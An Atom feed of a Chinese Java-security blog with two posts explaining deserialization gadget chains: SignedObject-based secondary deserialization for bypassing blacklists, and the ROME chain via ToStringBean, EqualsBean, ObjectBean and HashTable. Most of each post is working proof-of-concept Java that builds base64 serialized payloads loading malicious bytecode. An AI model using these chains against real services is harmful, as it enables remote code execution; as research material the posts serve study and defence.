<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>n4c1&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-08-21T13:55:26.682Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>n4c1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>二次反序列化</title>
    <link href="http://example.com/2024/08/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/08/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-21T05:44:37.000Z</published>
    <updated>2024-08-21T13:55:26.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h2><p>首先利用到的是<code>java.security</code> 这个包</p><p><code>java.security</code> 包是 Java 平台中用于提供安全框架和各种安全功能的核心包。它包含了用于管理和实现安全性相关的类和接口，例如加密、数字签名、密钥管理、访问控制、认证和权限等。这个包中的类广泛用于保护数据和应用程序的安全性。</p><p>简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是绕过<strong>黑名单的限制或不出网利用</strong></p><h2 id="利用连"><a href="#利用连" class="headerlink" title="利用连"></a>利用连</h2><h3 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h3><p>在<code>java.security.SignedObject</code>这个类中, 构造器将传入的可序列化对象进行了一次序列化</p><p><code>getObject</code>方法又对构造器序列化后的对象(<code>this.content</code>)进行了反序列化 如下图:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821142310512.png" alt="image-20240821142310512"></p><p>而这个<code>getObject</code>很明显就是一个getter, 那么就可以配合之前的Rome链, CB1链来调用</p><p>根据它的构造器. 利用下面这种方式来创建实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(恶意对象,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结合rome链"><a href="#结合rome链" class="headerlink" title="结合rome链"></a>结合rome链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">evilHashMap</span> <span class="operator">=</span> getEvilObj();</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilHashMap,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="comment">// EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结合commons-beanutils链"><a href="#结合commons-beanutils链" class="headerlink" title="结合commons-beanutils链"></a>结合commons-beanutils链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.getEvilTemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUnserial2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">evilHashMap</span> <span class="operator">=</span> getEvilObj();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilHashMap,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;object&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;signedObject, <span class="number">1</span>&#125;);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(priorityQueue);</span><br><span class="line"></span><br><span class="line">        string2file(poc, <span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="comment">// EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里getEvilObj可以是任何一条完整的反序列化链条,只要有对应的依赖即可</p><p>当然也可以使用CC来调用getObject方法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;认识&quot;&gt;&lt;a href=&quot;#认识&quot; class=&quot;headerlink&quot; title=&quot;认识&quot;&gt;&lt;/a&gt;认识&lt;/h2&gt;&lt;p&gt;首先利用到的是&lt;code&gt;java.security&lt;/code&gt; 这个包&lt;/p&gt;
&lt;p&gt;&lt;code&gt;java.security&lt;/code</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化之ROME反序列化</title>
    <link href="http://example.com/2024/08/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/08/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-20T10:21:08.000Z</published>
    <updated>2024-08-21T05:41:27.420Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是ROME"><a href="#什么是ROME" class="headerlink" title="什么是ROME"></a>什么是ROME</h2><p>简单来说, ROME工具库实现Java对象和XML数据之间的转换</p><h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><p>依然使用 jdk8u65</p><p>rome依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ROME反序列化使用动态字节码加载也就是我们熟悉的TemplatesImpl这个类来组成gadget</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>在CB1链中已经知道了TemplatesImpl#getOutputProperties这个getter方法会触发newITransformer方法导致类加载, 实际上这里也是同样的原理, 不同的只是谁来调用这个getter</p><h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820183813233.png" alt="image-20240820183813233"></p><p>这里的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br></pre></td></tr></table></figure><p>用来获取一个类的getter, 之后的for循环对这些getter进行了调用. 虽然这个方法是private, 但它的一个重载无参public方法对其进行了调用</p><p>那么接下来就是寻找toString在哪里调用了</p><p>ROME中有一个EqualsBean类它的hashcode方法间接调用了toString方法, 且这里的<code>_obj</code>可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820185015385.png" alt="image-20240820185015385"></p><p>之后套上hashMap的hashcode方法, 链子就完整了</p><p>那么就可以编写poc了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p><code>ObjectBean</code>的hashCode方法直接调用了<code>_equalsBean.hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下它的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass,Object obj,Set ignoreProperties)</span> &#123;</span><br><span class="line">    _equalsBean = <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(beanClass,obj);</span><br><span class="line">    _toStringBean = <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(beanClass,obj);</span><br><span class="line">    _cloneableBean = <span class="keyword">new</span> <span class="title class_">CloneableBean</span>(obj,ignoreProperties);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接创建了一个<code>EqualsBean</code>, 那么这个类就可以替换掉刚刚手动创建的的<code>EqualsBean</code></p><p>链子如下:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820202630402.png" alt="image-20240820202630402"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p>针对<code>HashMap</code>的过滤可以使用<code>HashTable</code>来绕过</p><p>在<code>HashTabl</code>e的<code>readObject</code>方法中对每一个<code>key</code>都进行了<code>reconstitutionPut</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820203751670.png" alt="image-20240820203751670"></p><p>跟进发现调用了<code>key.hashCode()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820203823164.png" alt="image-20240820203823164"></p><p>直接把Hashmap改成HashTable即可</p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span 